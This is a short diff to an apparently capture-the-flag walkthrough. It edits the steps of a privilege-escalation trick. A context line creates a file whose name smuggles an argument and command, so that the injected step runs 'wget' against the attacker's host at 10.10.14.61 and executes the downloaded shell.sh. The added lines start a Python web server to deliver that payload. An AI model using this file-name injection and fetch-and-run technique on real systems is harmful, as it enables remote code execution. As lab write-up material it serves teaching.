@@ -197,7 +197,15 @@ Ill first make the shell
 touch -- "-TT wget 10.10.14.61 -O shell.sh; bash shell.sh"
 ```
 
-Then ill remake the second file, this will get index.html by default from my web server and save it in shell.sh
+Then ill remake the second file, this will get index.html by default from my web server and save it in shell.sh then run it
+
+```python
+python3 -m http.server 80
+```
+
+Then ill start a web server
+
+
 
 
 
